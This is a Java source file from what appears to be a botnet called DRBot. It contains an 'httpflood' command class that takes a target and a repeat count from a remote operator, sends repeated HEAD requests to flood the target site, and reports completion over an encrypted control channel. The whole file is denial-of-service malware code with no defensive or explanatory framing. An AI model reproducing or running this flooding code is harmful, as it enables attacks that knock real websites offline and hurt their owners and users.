package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;


/**
 *
 * @author MerNat
 */

public class httpflood extends Thread implements Runnable {
    private final String Target;
    private long forLong;
    private final PrintWriter writer;
    private final SecureLine secureLine;
    //private httpflood f1,f2;
    
    httpflood(String[] command,PrintWriter writer,SecureLine secureLine){
        Target = command[1];
        this.writer = writer;
        this.secureLine = secureLine;
        try{
                    forLong = Long.decode(command[2]).longValue();
        }
        catch(Exception fd){
                toPrint("[Http Flooding] Error in Writing.");    
        }
    }
    
    @Override
    public void run(){
        long i = 1;
     while(i<=forLong){
			  if ((flood("http://"+Target+"")) == true)  {}
                          else{
				  if ((flood("http://"+Target+"")) == false)  {}
                          }
                          i++;
         }
         toPrint("[Http Flooding] On " + Target + " is done.");
    }
    private boolean flood(String URLName){
    
        String userAgentPayload = "DuosLogo.";
      int TIMEOUT_VALUE = 0;
	  try {
      HttpURLConnection.setFollowRedirects(false);
      HttpURLConnection con =(HttpURLConnection) new URL(URLName).openConnection();
      con.setInstanceFollowRedirects(false);
      con.setConnectTimeout(TIMEOUT_VALUE);
      con.setReadTimeout(TIMEOUT_VALUE);
      con.setRequestMethod("HEAD");   
      con.addRequestProperty("User-Agent", userAgentPayload);
      con.disconnect();
      return (con.getResponseCode() == HttpURLConnection.HTTP_OK);
    }      
    catch (Exception e) {
       return false;
    }
  }
     private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
}
